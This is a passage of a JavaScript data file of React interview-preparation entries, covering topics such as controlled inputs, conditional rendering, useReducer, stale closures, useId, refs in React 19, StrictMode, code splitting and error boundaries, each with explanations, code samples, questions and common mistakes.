        { q: "What causes the 'changing an uncontrolled input to be controlled' warning?", a: "The `value` prop started as `undefined` or `null` and later became a string. Initialise state with an empty string so it is controlled from the start." },
        { q: "Why call `e.preventDefault()` in onSubmit?", a: "A form submit makes the browser navigate and reload the page by default. preventDefault stops that so your JavaScript handles the data." },
      ],
      answer30: "A controlled input gets its value from React state and updates it through onChange, so React always knows the value and I can validate or format as the user types. An uncontrolled input keeps its value in the DOM; I set a defaultValue and read it with a ref or FormData on submit. Controlled is my default for small, interactive forms. For big forms I use react-hook-form, which uses uncontrolled inputs to avoid a re-render per keystroke.",
      mistakes: [
        "Setting `value` without `onChange`: the input becomes read-only and React warns.",
        "Initialising state as `undefined` and later setting a string.",
        "Forgetting `e.preventDefault()`, so the page reloads on submit.",
        "Trap: 'Is a controlled input always better?' No. It's simpler to reason about, but costs a re-render per keystroke; uncontrolled is fine and often faster for big forms.",
      ],
      takeaway: "Controlled means state owns the value; uncontrolled means the DOM does and you read it on submit.",
    },

    {
      id: 'conditional-rendering-events',
      title: 'Conditional rendering and event handling',
      level: 'basic',
      priority: 'must',
      frequency: 'common',
      summary: 'Show different UI with if, ternaries and &&; handle events with camelCase props that receive a synthetic event.',
      what: [
        "Conditional rendering means showing different JSX depending on state. Use an early `return` for whole-screen cases (loading, error), a ternary `a ? <A /> : <B />` for either/or, and `cond && <A />` for 'show or nothing'. Returning `null` renders nothing.",
        "Events are props in camelCase: `onClick`, `onChange`, `onSubmit`. You pass a function, not a call: `onClick={save}` or `onClick={() => save(id)}`, never `onClick={save()}`.",
      ],
      deeper: [
        "React wraps native browser events in a **SyntheticEvent** that behaves the same in all browsers. It has `preventDefault()`, `stopPropagation()`, `target` and `currentTarget`. Since React 17, React attaches its listeners to the root container rather than `document`, which makes several React apps on one page play nicely.",
        "The `&&` trap: `{items.length && <List />}` renders `0` when the array is empty, because `0` is a value React prints. Use `items.length > 0 &&`.",
        "Hiding with CSS keeps the component mounted (state is kept); not rendering it unmounts it (state is lost). Choose deliberately.",
      ],
      why: "Almost every screen has loading, empty, error and success states, and buttons that do something. Getting these right avoids flicker, stray zeros, and handlers that fire on render.",
      analogy: "A traffic light: depending on the state, exactly one light shows. The button on the pole (event) changes the state, and the light follows.",
      code: {
        lang: 'jsx',
        source: `function JobList({ status, jobs, onDelete }) {
  if (status === 'loading') return <p>Loading...</p>;      // early return
  if (status === 'error') return <p role="alert">Could not load jobs</p>;

  return (
    <>
      {jobs.length === 0 ? <p>No jobs yet</p> : (
        <ul>
          {jobs.map((job) => (
            <li key={job.id}>
              {job.title} {job.urgent && <strong>Urgent</strong>}
              {/* arrow function so the call happens on click, not during render */}
              <button onClick={(e) => { e.stopPropagation(); onDelete(job.id); }}>
                Delete
              </button>
            </li>
          ))}
        </ul>
      )}
    </>
  );
}`,
      },
      output: "While loading it shows 'Loading...'; on error an alert message. With an empty list it shows 'No jobs yet'. Otherwise each job is listed, urgent ones get a bold 'Urgent' label, and clicking Delete calls `onDelete` with that job's id without triggering any click handler on a parent element.",
      questions: [
        { q: "Why does `{count && <Badge />}` sometimes show a 0?", a: "`&&` returns the left value when it's falsy. React doesn't render `false`, `null` or `undefined`, but it does render the number `0`. Use `count > 0 &&` or a ternary." },
        { q: "What is the difference between `onClick={save}` and `onClick={save()}`?", a: "The first passes the function so React calls it on click. The second calls it immediately during render and passes its return value, which usually causes bugs or infinite loops if it sets state." },
        { q: "What is a SyntheticEvent?", a: "React's cross-browser wrapper around the native event, with the same interface (`preventDefault`, `stopPropagation`, `target`). The native event is available as `e.nativeEvent`." },
        { q: "How do you pass an argument to an event handler?", a: "Wrap it in an arrow function, like `onClick={() => remove(id)}`, or read it from a `data-` attribute on `e.currentTarget`." },
      ],
      answer30: "For conditional rendering I use early returns for loading and error, ternaries for either/or, and && for optional bits, being careful that a number 0 on the left of && actually renders. Events are camelCase props that take a function; I pass the function, not a call, and use an arrow when I need arguments. React gives me a SyntheticEvent with preventDefault and stopPropagation, and since React 17 its listeners sit on the root container.",
      mistakes: [
        "`onClick={handleClick()}`: runs during render.",
        "`{list.length && ...}` printing 0.",
        "Deeply nested ternaries in JSX. Move the logic into variables or a small component.",
        "Trap: 'Does `return false` in a handler prevent the default action?' Not in React. You must call `e.preventDefault()` explicitly.",
      ],
      takeaway: "Pass functions to events, not calls; watch the `0 &&` trap; unmounting loses state, hiding keeps it.",
    },

    {
      id: 'lifting-state-composition',
      title: 'Lifting state up and composition vs inheritance',
      level: 'basic',
      priority: 'must',
      frequency: 'common',
      summary: 'Move shared state to the closest common parent, and build components by nesting them (children), not by extending classes.',
      what: [
        "When two sibling components need the same data, move the state up to their closest common parent and pass it down as props, plus a callback to change it. This is called **lifting state up**.",
        "**Composition** means building bigger components by putting smaller ones inside them, often through the `children` prop or other props that accept JSX. React recommends composition instead of class inheritance for sharing UI.",
      ],
      deeper: [
        "Keep state as low as possible and lift only as far as needed. Lifting too high makes big parts of the tree re-render on every change.",
        "Composition also fixes a lot of prop drilling. Instead of passing `user` through `Layout` to `Header` to `Avatar`, let the top component render `<Layout header={<Header user={user} />} />`. The middle component only places the slot; it doesn't need to know about `user`.",
        "The React team has said they have not found use cases where they'd recommend component inheritance hierarchies. Reuse logic with custom hooks and reuse UI with composition.",
      ],
      why: "It keeps one source of truth for each piece of data, so siblings never disagree, and it keeps components flexible without deep class hierarchies.",
      analogy: "Two kids fighting over the TV remote: give the remote to the parent (lift state) and let the kids ask for channel changes (callbacks). Composition is Lego: you snap pieces together instead of carving a new piece from an old one.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';

// Composition: Card doesn't care what goes inside it
function Card({ title, children, footer }) {
  return (
    <section className="card">
      <h2>{title}</h2>
      {children}
      {footer && <footer>{footer}</footer>}
    </section>
  );
}

function FilterInput({ value, onChange }) {
  return <input value={value} onChange={(e) => onChange(e.target.value)} />;
}

function CandidateList({ filter }) {
  const all = ['Asha', 'Ravi', 'Arjun'];
  return <ul>{all.filter((n) => n.toLowerCase().includes(filter.toLowerCase())).map((n) => <li key={n}>{n}</li>)}</ul>;
}

// Lifted state: the parent owns 'filter' so both siblings stay in sync
export default function CandidatesPage() {
  const [filter, setFilter] = useState('');
  return (
    <Card title="Candidates" footer={<small>Showing results for '{filter}'</small>}>
      <FilterInput value={filter} onChange={setFilter} />
      <CandidateList filter={filter} />
    </Card>
  );
}`,
      },
      output: "Typing 'a' in the input updates the parent's `filter`, so the list shows Asha, Ravi and Arjun (all contain 'a'), and the footer reads \"Showing results for 'a'\". Typing 'ar' leaves Arjun only. Card renders whatever it is given and knows nothing about filtering.",
      questions: [
        { q: "What does lifting state up mean?", a: "Moving state that several components need to their closest common parent, then passing the value down as props and a setter or callback so children can request changes." },
        { q: "Why does React prefer composition over inheritance?", a: "Components can accept any JSX through `children` and other props, which covers the cases inheritance would. It keeps components loosely coupled; logic reuse goes into custom hooks." },
        { q: "How can composition reduce prop drilling?", a: "Pass the already-built element down instead of the data. The parent renders `<Layout sidebar={<Profile user={user} />} />`, so Layout never has to forward `user`." },
        { q: "Where should state live?", a: "In the lowest component that needs it, or the closest common parent if several components share it. Keep it as local as possible to limit re-renders." },
      ],
      answer30: "When two components need the same state, I lift it to their closest common parent and pass the value and a callback down, so there's one source of truth. I keep state as low as possible otherwise. For reuse I use composition: components take children or slot props with JSX, which also cuts prop drilling because I can pass a built element instead of raw data. Inheritance isn't used for components in React; logic reuse goes into custom hooks.",
      mistakes: [
        "Copying the same data into state in two siblings and trying to keep them in sync with effects.",
        "Lifting all state to the App component, so every keystroke re-renders the whole app.",
        "Reaching for Context or Redux when lifting state one level would do.",
        "Trap: 'Copying props into state' (`useState(props.value)`) only uses the first value; later prop changes are ignored. Use the prop directly or give the component a `key` to reset it.",
      ],
      takeaway: "Shared state goes to the closest common parent; reuse UI by composing, not inheriting.",
    },

    {
      id: 'use-reducer',
      title: 'useReducer',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Manage state with a pure reducer function and dispatched actions, when updates are many or related.',
      what: [
        "`useReducer(reducer, initialState)` returns `[state, dispatch]`. Instead of calling setters directly, you `dispatch({ type: 'added', item })`, and a **reducer** function `(state, action) => newState` decides how the state changes.",
        "It is the same idea as Redux, but local to one component.",
      ],
      deeper: [
        "Pick useReducer when several pieces of state change together (status, data, error), when the next state depends on the previous one in many ways, or when many event handlers update the same state. The update logic sits in one place and is easy to unit test because the reducer is a pure function.",
        "`dispatch` has a stable identity, so you can pass it down or use it in effects without adding it to dependencies or wrapping it in useCallback. Combined with Context, `dispatch` is a neat way to let deep children trigger updates.",
        "The reducer must be pure: no API calls, no mutation, no random values. In StrictMode React calls it twice in development to catch impure reducers.",
      ],
      why: "With five `useState` calls and ten handlers, updates get scattered and it's easy to leave the state inconsistent, like `loading: true` and `error: 'x'` at the same time. A reducer makes every possible change explicit.",
      analogy: "A bank teller. You don't touch the vault yourself; you hand over a slip ('deposit 100'). The teller follows fixed rules and gives back the new balance.",
      code: {
        lang: 'js',
        title: 'The reducer is plain JavaScript, so you can run and test it without React',
        source: `const initialState = { items: [], status: 'idle', error: null };

function cartReducer(state, action) {
  switch (action.type) {
    case 'added':
      return { ...state, items: [...state.items, action.item] };
    case 'removed':
      return { ...state, items: state.items.filter((i) => i.id !== action.id) };
    case 'checkout_started':
      return { ...state, status: 'loading', error: null };
    case 'checkout_failed':
      return { ...state, status: 'error', error: action.error };
    default:
      throw new Error('Unknown action: ' + action.type);
  }
}

let s = initialState;
s = cartReducer(s, { type: 'added', item: { id: 1, name: 'Book' } });
s = cartReducer(s, { type: 'added', item: { id: 2, name: 'Pen' } });
s = cartReducer(s, { type: 'removed', id: 1 });
s = cartReducer(s, { type: 'checkout_started' });
console.log(s);
console.log(initialState.items.length); // original untouched

// In a component:
// const [state, dispatch] = useReducer(cartReducer, initialState);
// <button onClick={() => dispatch({ type: 'removed', id: item.id })}>Remove</button>`,
      },
      output: "It prints `{ items: [ { id: 2, name: 'Pen' } ], status: 'loading', error: null }` and then `0`. Each action produced a new object, and the original `initialState` was never mutated.",
      questions: [
        { q: "When would you pick useReducer over useState?", a: "When several values change together, when there are many kinds of updates, or when the next state depends on the previous one in complex ways. For one or two independent values, useState is simpler." },
        { q: "Why must a reducer be pure?", a: "React may call it more than once (StrictMode does in development) and relies on comparing old and new state. Side effects or mutation would cause duplicate requests or missed re-renders." },
        { q: "Do you need useCallback for dispatch?", a: "No. React guarantees `dispatch` is stable for the life of the component, so it is safe in dependency arrays and as a prop." },
        { q: "How is useReducer different from Redux?", a: "Same pattern, but useReducer state is local to one component. Redux (Toolkit) is a global store with middleware, devtools and selectors so components subscribe to slices." },
      ],
      answer30: "useReducer moves update logic into a pure reducer function, and components dispatch actions describing what happened. I reach for it when state has several related fields, like status, data and error, or many update paths, because every transition lives in one place and the reducer is easy to unit test. dispatch is stable, so I can pass it down or combine it with Context for a small app-wide store without Redux.",
      mistakes: [
        "Mutating state inside the reducer (`state.items.push(x); return state`).",
        "Doing fetches or other side effects inside the reducer. Do them in handlers or effects, then dispatch the result.",
        "Forgetting a default case, so typos in action types silently do nothing.",
        "Trap: 'Is useReducer faster than useState?' No. useState is built on the same mechanism. The benefit is organisation, not speed.",
      ],
      takeaway: "useReducer centralises related updates in a pure, testable function; dispatch is stable.",
    },

    {
      id: 'stale-closures',
      title: 'Stale closures in hooks',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'A function created in an old render keeps seeing that render\'s values, even after state has moved on.',
      what: [
        "Every render creates new functions, and each function remembers (closes over) the props and state from the render that created it. If an old function is still running later, like a `setInterval` callback or an event listener added once, it sees old values. That is a **stale closure**.",
        "The classic symptom: a counter in `setInterval` with `[]` dependencies that goes 0, 1, 1, 1... forever.",
      ],
      deeper: [
        "Three fixes, in order of preference. (1) Use the updater form `setCount(c => c + 1)`, which doesn't need the current value at all. (2) Add the value to the dependency array so the effect re-subscribes with a fresh closure. (3) Keep the latest value or callback in a ref and read `ref.current` inside the long-lived function.",
        "The eslint rule `react-hooks/exhaustive-deps` catches most of these. Silencing it is usually how stale closures sneak in.",
        "React 19.2 added `useEffectEvent`, a hook for logic inside an effect that should read the latest props and state without making the effect re-run. It is the official version of the 'latest ref' pattern.",
      ],
      why: "Stale closures cause some of the most confusing React bugs: timers that stop updating, websocket handlers that use an old user id, debounced functions that send old form data.",
      analogy: "A photo of a clock. Look at the photo an hour later and it still shows the old time. A ref is a window onto the real clock.",
      code: [
        {
          lang: 'js',
          title: 'What happens underneath (runs in Node)',
          source: `// Simulates React: every render creates new closures over THAT render's value
let state = 0;              // what React stores
const ref = { current: 0 }; // like useRef: one box shared by all renders

function render() {
  const count = state;      // snapshot for this render
  ref.current = state;      // keep the box up to date
  return {
    logLater: () => console.log('closure sees', count, '| ref sees', ref.current),
  };
}

const firstRender = render(); // count is 0; a timer is started here
state = 5;                    // setCount(5) -> React re-renders
render();
firstRender.logLater();       // the old timer fires now`,
        },
        {
          lang: 'jsx',
          title: 'The bug and the fix in a component',
          source: `import { useEffect, useState } from 'react';

export default function Ticker() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      // BUG: setCount(count + 1) would always read count = 0 from the first render
      setCount((c) => c + 1); // FIX: the updater gets the latest value
    }, 1000);
    return () => clearInterval(id);
  }, []); // runs once, and that's fine now

  return <p>{count}</p>;
}`,
        },
      ],
      output: "The Node script prints `closure sees 0 | ref sees 5`: the old function still holds its render's snapshot, while the ref shows the latest value. In the component, the buggy version would show 1 forever; with the updater form it counts 1, 2, 3...",
      questions: [
        { q: "What is a stale closure in React?", a: "A function created during an earlier render that still runs later and reads that render's old props or state, because closures capture values at the time they were created." },
        { q: "My setInterval counter is stuck at 1. Why?", a: "The interval callback was created in the first render with `[]` dependencies, so it always sees `count = 0` and keeps setting 1. Use `setCount(c => c + 1)`." },
        { q: "How do you read the latest value inside a long-lived listener?", a: "Store it in a ref and update the ref each render (or in an effect), then read `ref.current` in the listener. In React 19.2+ `useEffectEvent` does this officially for effect logic." },
        { q: "How can you catch stale closures early?", a: "Keep the `react-hooks/exhaustive-deps` lint rule on and fix its warnings instead of disabling it." },
      ],
      answer30: "Each render's functions capture that render's props and state. If a function outlives its render, like an interval or a listener registered once, it keeps reading old values: a stale closure. I fix it by using the updater form of setState, by listing the value in the dependency array so the effect re-subscribes, or by keeping the latest value in a ref. React 19.2 also added useEffectEvent for exactly this case. The exhaustive-deps lint rule catches most of these.",
      mistakes: [
        "Disabling `exhaustive-deps` to stop an effect from re-running, which freezes the values inside it.",
        "Debouncing with a function recreated every render, so each render gets a different debounce timer.",
        "Adding listeners with `[]` and reading props inside them.",
        "Trap: 'Is this a React bug?' No, it's normal JavaScript closure behaviour. React just makes it visible because each render is a new function call.",
      ],
      takeaway: "Old functions see old values; use updaters, correct deps, or a ref for the latest value.",
    },

    {
      id: 'use-layout-effect',
      title: 'useLayoutEffect',
      level: 'intermediate',
      priority: 'good',
      frequency: 'occasional',
      summary: 'Like useEffect, but runs before the browser paints, so you can measure the DOM and fix layout without a flicker.',
      what: [
        "`useLayoutEffect` has the same signature as `useEffect`. The difference is timing: it runs right after React updates the DOM but **before** the browser paints the screen. `useEffect` usually runs after the paint.",
        "Use it when you need to measure something (an element's size or position) and immediately change the layout based on it, for example positioning a tooltip.",
      ],
      deeper: [
        "Because it runs before paint and blocks it, slow code in `useLayoutEffect` delays what the user sees. Prefer `useEffect` and switch only when you see a visible flicker.",
        "State updates inside `useLayoutEffect` are processed synchronously before paint, so the user never sees the 'wrong' first version.",
        "It does nothing on the server. In older React versions it printed a warning during SSR; the usual answer is to move the logic to `useEffect` or only render that component on the client.",
      ],
      why: "With useEffect, the user can briefly see an element in the wrong place before you move it. useLayoutEffect removes that flash.",
      analogy: "A stage crew adjusting props while the curtain is still down (layout effect) versus fixing them after the curtain rises while the audience watches (effect).",
      code: {
        lang: 'jsx',
        source: `import { useLayoutEffect, useRef, useState } from 'react';

export function Tooltip({ targetRect, text }) {
  const ref = useRef(null);
  const [top, setTop] = useState(0);

  useLayoutEffect(() => {
    const { height } = ref.current.getBoundingClientRect(); // measure
    // Not enough room above? Put it below the target instead.
    const placeAbove = targetRect.top - height > 0;
    setTop(placeAbove ? targetRect.top - height : targetRect.bottom);
  }, [targetRect]);

  return (
    <div ref={ref} style={{ position: 'fixed', top, left: targetRect.left }}>
      {text}
    </div>
  );
}`,
      },
      output: "The tooltip is measured and moved before the browser paints, so the user sees it only in its final position. With useEffect instead, it could flash at `top: 0` for one frame and then jump.",
      questions: [
        { q: "useEffect vs useLayoutEffect?", a: "Same API. useLayoutEffect runs synchronously after DOM changes but before paint; useEffect runs after paint. Use the layout version only to measure and adjust layout without flicker." },
        { q: "Why not always use useLayoutEffect?", a: "It blocks painting, so heavy work makes the app feel slower. useEffect keeps the UI responsive and is right for fetching, subscriptions and logging." },
        { q: "What happens to useLayoutEffect on the server?", a: "It doesn't run, because there is no layout on the server. Code that needs it should run only on the client." },
      ],
      answer30: "useLayoutEffect has the same API as useEffect but runs after React mutates the DOM and before the browser paints. I use it only when I need to measure the DOM and adjust layout in the same frame, like positioning a tooltip, to avoid a visible flicker. Everything else goes in useEffect, because layout effects block painting.",
      mistakes: [
        "Using useLayoutEffect for data fetching.",
        "Doing heavy calculations in it, which delays the first paint.",
        "Trap: 'Which runs first, useLayoutEffect or useEffect?' Layout effects run first, synchronously during commit; regular effects run after paint.",
      ],
      takeaway: "useLayoutEffect = measure and adjust before paint; default to useEffect.",
    },

    {
      id: 'use-id',
      title: 'useId',
      level: 'intermediate',
      priority: 'rare',
      frequency: 'occasional',
      summary: 'Generates a unique id that matches between server and client, for linking labels and inputs.',
      what: [
        "`useId()` returns a unique string like `:r1:` (the exact format changed in React 19.1 to use `«»`, and again in 19.2 to `_r_`, so never depend on the format). It's for accessibility attributes: `htmlFor`, `aria-describedby`, `aria-labelledby`.",
        "If a component is used twice on a page, each instance gets its own id, so labels never point at the wrong input.",
      ],
      deeper: [
        "Why not `Math.random()` or a global counter? During server-side rendering, the server and client must produce the same id, or hydration fails. useId bases the id on the component's position in the tree, so both sides agree.",
        "Do not use it for list keys. Keys must come from your data.",
      ],
      why: "Reusable form components need ids to connect labels and help text to inputs, and hard-coded ids break as soon as the component appears twice.",
      analogy: "Seat numbers printed on tickets from the seating chart: the box office (server) and the usher (client) both read the same chart, so they always agree.",
      code: {
        lang: 'jsx',
        source: `import { useId } from 'react';

function PasswordField({ label }) {
  const id = useId();
  return (
    <div>
      <label htmlFor={id}>{label}</label>
      <input id={id} type="password" aria-describedby={id + '-hint'} />
      <p id={id + '-hint'}>At least 12 characters.</p>
    </div>
  );
}

export default function Form() {
  return (
    <>
      <PasswordField label="Password" />
      <PasswordField label="Confirm password" />
    </>
  );
}`,
      },
      output: "Both fields get different ids, so clicking 'Confirm password' focuses the second input and screen readers read the right hint for each one.",
      questions: [
        { q: "What is useId for?", a: "Generating unique, stable ids for accessibility attributes like `htmlFor` and `aria-describedby`, which also match between server and client rendering." },
        { q: "Why not use Math.random() for ids?", a: "The server and the client would generate different values, which causes hydration mismatches. It would also change on every render." },
        { q: "Can I use useId for list keys?", a: "No. Keys should come from your data. useId is for ids in the DOM." },
      ],
      answer30: "useId gives a unique id per component instance that's the same on the server and the client, because it's based on the component's position in the tree. I use it to connect labels, inputs and aria attributes in reusable form components. It's not for list keys, and I never rely on the id's exact format.",
      mistakes: [
        "Using it for list keys.",
        "Hard-coding `id='email'` in a reusable component that appears twice on the page.",
        "Trap: 'Can I use the id in a CSS selector?' The generated characters can need escaping in `querySelector`, which is one reason React changed the format; it's meant for attributes, not selectors.",
      ],
      takeaway: "useId = SSR-safe unique ids for accessibility attributes, not for keys.",
    },

    {
      id: 'forwardref-imperative-handle',
      title: 'forwardRef, useImperativeHandle, and ref as a prop (React 19)',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'How a parent gets a ref to something inside a child component, and how React 19 made it simpler.',
      what: [
        "Normally a ref on a component (`<MyInput ref={r} />`) doesn't reach the DOM inside it. Up to React 18 you wrapped the child in `forwardRef((props, ref) => ...)` to pass the ref through to an inner element.",
        "In **React 19**, function components receive `ref` as a normal prop: `function MyInput({ ref, ...props })`. `forwardRef` still works but is no longer needed, and React plans to deprecate it in a future version.",
        "`useImperativeHandle(ref, () => ({ focus, clear }))` lets the child decide what the parent gets: a small custom object instead of the whole DOM node.",
      ],
      deeper: [
        "Use imperative handles sparingly: focus, scroll, play/pause, or reset. If you can express it with props (`isOpen`), prefer props.",
        "React 19 also lets ref callbacks return a cleanup function, like effects. When you return one, React calls it on detach instead of calling the callback with `null`.",
        "Design-system libraries still often use `forwardRef` so they keep supporting React 18 users.",
      ],
      why: "Reusable input, modal and video components need to let parents focus or control them without exposing every internal detail.",
      analogy: "A TV remote: the TV (child) decides which buttons to expose (power, volume) instead of handing you the circuit board (the DOM node).",
      code: [
        {
          lang: 'jsx',
          title: 'React 19: ref is just a prop',
          source: `import { useImperativeHandle, useRef } from 'react';

function SearchBox({ ref, placeholder }) {
  const inputRef = useRef(null);

  // Expose only two methods, not the whole <input>
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current.focus(),
    clear: () => { inputRef.current.value = ''; },
  }), []);

  return <input ref={inputRef} placeholder={placeholder} />;
}

export default function Page() {
  const searchRef = useRef(null);
  return (
    <>
      <SearchBox ref={searchRef} placeholder="Search candidates" />
      <button onClick={() => searchRef.current.focus()}>Focus</button>
      <button onClick={() => searchRef.current.clear()}>Clear</button>
    </>
  );
}`,
        },
        {
          lang: 'jsx',
          title: 'React 18 and earlier: forwardRef',
          source: `import { forwardRef } from 'react';

const FancyInput = forwardRef(function FancyInput(props, ref) {
  return <input ref={ref} className="fancy" {...props} />;
});`,
        },
      ],
      output: "Clicking Focus puts the cursor in the search box; Clear empties it. The parent can only call `focus` and `clear`; it can't, for example, change the input's styles, because the handle exposes nothing else.",
      questions: [
        { q: "What does forwardRef do?", a: "It lets a function component receive a `ref` from its parent and attach it to an inner element. It was required before React 19; in React 19 `ref` is a regular prop for function components." },
        { q: "What changed about refs in React 19?", a: "Function components get `ref` as a prop, so forwardRef isn't needed for new code, and ref callbacks can return a cleanup function." },
        { q: "When would you use useImperativeHandle?", a: "When a parent needs to trigger an action like focus, scroll, or reset, and you want to expose a small API instead of the raw DOM node." },
        { q: "Can you put a ref on a class component?", a: "Yes, and the ref then points at the class instance. Function components never had instances, which is why they needed forwardRef or, now, the ref prop." },
      ],
      answer30: "A ref on a custom component doesn't automatically reach its DOM. Up to React 18 I'd wrap the child in forwardRef to pass it through; in React 19 function components just receive ref as a prop, and forwardRef is on its way to deprecation. If I don't want to expose the whole DOM node, useImperativeHandle lets the child return a small object with methods like focus or clear. I only use this for imperative actions; everything else goes through props.",
      mistakes: [
        "Using imperative handles for things props can do, like opening a modal.",
        "Forgetting a dependency array on useImperativeHandle, recreating the handle every render.",
        "Assuming a library on React 18 accepts ref as a prop.",
        "Trap: 'Is forwardRef removed in React 19?' No, it still works; the docs say it will be deprecated in a future release.",
      ],
      takeaway: "React 19: ref is a prop; useImperativeHandle exposes a small, controlled API.",
    },

    {
      id: 'strict-mode',
      title: 'StrictMode',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'A development-only wrapper that double-runs renders and effects to expose impure code and missing cleanup.',
      what: [
        "`<StrictMode>` is a component you wrap around your app. It renders nothing visible and has **no effect in production**. In development it turns on extra checks.",
        "The checks: components render twice (to find impure render logic), effects run setup, cleanup, setup on mount (to find missing cleanup), ref callbacks are run an extra time too (React 19), and warnings appear for deprecated APIs.",
      ],
      deeper: [
        "The double effect is why 'my API was called twice' is a common question. It isn't a bug in React: it simulates a component unmounting and mounting again, which really happens with features like fast refresh or offscreen rendering. If your effect cleans up properly, the user can't tell the difference.",
        "During the second render React dims the console logs (in React DevTools you can hide them), so they don't confuse you.",
        "Don't 'fix' the double call with a `useRef` flag that skips the second run. Fix the effect: abort the request in cleanup, or move data fetching into a library that deduplicates.",
      ],
      why: "Bugs from impure renders and missing cleanups are hard to spot and show up later with concurrent rendering. StrictMode forces them to appear early, in development.",
      analogy: "A fire drill. You walk out and back in on purpose so you learn the exits work before a real fire.",
      code: {
        lang: 'jsx',
        source: `import { StrictMode, useEffect } from 'react';
import { createRoot } from 'react-dom/client';

function Chat({ roomId }) {
  useEffect(() => {
    const conn = createConnection(roomId);
    conn.connect();
    console.log('connected', roomId);
    return () => {
      conn.disconnect(); // without this, StrictMode leaves two open connections
      console.log('disconnected', roomId);
    };
  }, [roomId]);
  return <h1>Room {roomId}</h1>;
}

createRoot(document.getElementById('root')).render(
  <StrictMode>
    <Chat roomId="general" />
  </StrictMode>
);`,
      },
      output: "In development the console shows 'connected general', 'disconnected general', 'connected general'. One connection stays open, as intended. In production you see 'connected general' only once. If cleanup were missing, development would show two live connections, exposing the leak.",
      questions: [
        { q: "Why do my effects run twice in development?", a: "StrictMode mounts, unmounts and remounts each component once in development to check that effects clean up properly. It doesn't happen in production." },
        { q: "Does StrictMode affect production?", a: "No. All its checks are development-only, and it renders no UI." },
        { q: "How should you handle a fetch firing twice under StrictMode?", a: "Make the effect safe to re-run: abort or ignore the first request in cleanup, or use a data library like TanStack Query that dedupes and caches. Don't hack around it with a ref flag." },
      ],
      answer30: "StrictMode is a development-only wrapper. It renders components twice to catch impure render code and runs effect setup, cleanup, setup on mount to catch missing cleanup, and it warns about deprecated APIs. That's why requests sometimes fire twice in development. The fix is to make effects clean up properly, not to remove StrictMode, since the same remounting can happen for real with newer React features.",
      mistakes: [
        "Removing StrictMode to stop double logs instead of fixing the effect.",
        "Using a 'has run' ref to skip the second effect run.",
        "Side effects inside the render body, which run twice in development.",
        "Trap: 'Will users get double analytics events?' Not from StrictMode; it's development-only. But a missing cleanup can still cause real duplicates in production.",
      ],
      takeaway: "StrictMode double-runs in development to surface impure renders and missing cleanup; fix the code, keep the wrapper.",
    },

    {
      id: 'lazy-suspense-code-splitting',
      title: 'React.lazy, Suspense, and code splitting',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Load a component\'s code only when it is needed, and show a fallback while it loads.',
      what: [
        "By default a bundler puts all your code into one big JavaScript file, so users download every page before seeing the first one. **Code splitting** breaks it into smaller chunks that load on demand.",
        "`React.lazy(() => import('./Reports'))` turns a dynamic import into a component that loads its code the first time it renders. `<Suspense fallback={<Spinner />}>` shows the fallback until that code arrives.",
      ],
      deeper: [
        "The best place to split is at routes: each page becomes its own chunk. Next, split heavy widgets that many users never open: charts, rich-text editors, PDF viewers, admin panels.",
        "Suspense is not only for code. In React 18+ and 19 it also waits for data from Suspense-enabled sources: frameworks like Next.js, TanStack Query's `useSuspenseQuery`, or a promise read with React 19's `use()`. It does not detect data fetched inside a plain `useEffect`.",
        "`lazy` must be called at the top level of a module, not inside a component, or a new lazy component is created each render and its state is reset. The module must have a default export (or you map a named export in the import).",
        "If a chunk fails to load (bad network, or a new deploy removed the old file), the lazy component throws. Wrap it in an error boundary with a 'Retry' option.",
      ],
      why: "A smaller first download means a faster first screen, especially on mobile. Users pay only for the pages they actually visit.",
      analogy: "A restaurant that cooks each course when you order it, instead of putting every dish on the menu on your table at once.",
      code: {
        lang: 'jsx',
        source: `import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router';

// Top-level: each import() becomes a separate chunk
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Reports = lazy(() => import('./pages/Reports')); // heavy charts live here

export default function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<p>Loading page...</p>}>
        <Routes>
          <Route path="/" element={<Dashboard />} />
          <Route path="/reports" element={<Reports />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}`,
      },
      output: "On first visit to '/', only the main bundle and the Dashboard chunk download. The Reports chunk (with its chart library) downloads the first time the user goes to '/reports', while 'Loading page...' shows briefly. Later visits use the cached chunk.",
      questions: [
        { q: "What is code splitting and why do it?", a: "Splitting the JavaScript bundle into chunks that load on demand, so the initial download is smaller and the first page shows faster." },
        { q: "How does React.lazy work?", a: "It takes a function returning a dynamic `import()`. The first time the component renders, React starts loading the module and suspends; the nearest Suspense boundary shows its fallback until the code arrives." },
        { q: "Where would you place Suspense boundaries?", a: "Around routes for page-level loading, and around independent heavy widgets so one slow part doesn't blank the whole page. Too many boundaries create a 'popcorn' effect of spinners." },
        { q: "What happens if the lazy chunk fails to load?", a: "The import promise rejects and the component throws. An error boundary around it should catch that and offer a retry or a reload." },
      ],
      answer30: "Code splitting breaks the bundle into chunks that load on demand. In React I use lazy with a dynamic import, usually per route and for heavy widgets like charts or editors, and wrap them in Suspense with a fallback. I define lazy components at module level, and I add an error boundary because chunk loads can fail after a deploy. Suspense also works for data when the source supports it, like a framework or useSuspenseQuery, but not for a plain fetch in useEffect.",
      mistakes: [
        "Calling `lazy()` inside a component.",
        "Lazy-loading tiny components, which adds network requests for no gain.",
        "No error boundary, so a failed chunk load shows a blank screen.",
        "Trap: 'Does Suspense catch errors?' No. Suspense handles loading; error boundaries handle errors. You usually need both.",
      ],
      takeaway: "Split by route and heavy widget with lazy + Suspense; pair it with an error boundary.",
    },

    {
      id: 'error-boundaries',
      title: 'Error boundaries',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Components that catch rendering errors below them and show a fallback instead of a blank page.',
      what: [
        "If a component throws during rendering and nothing catches it, React unmounts the whole app and the user sees a white screen. An **error boundary** catches the error for its subtree and shows fallback UI instead.",
        "Error boundaries must still be class components with `static getDerivedStateFromError` (to show the fallback) and/or `componentDidCatch` (to log). There is no hook version yet, so most teams use the small `react-error-boundary` package.",
      ],
      deeper: [
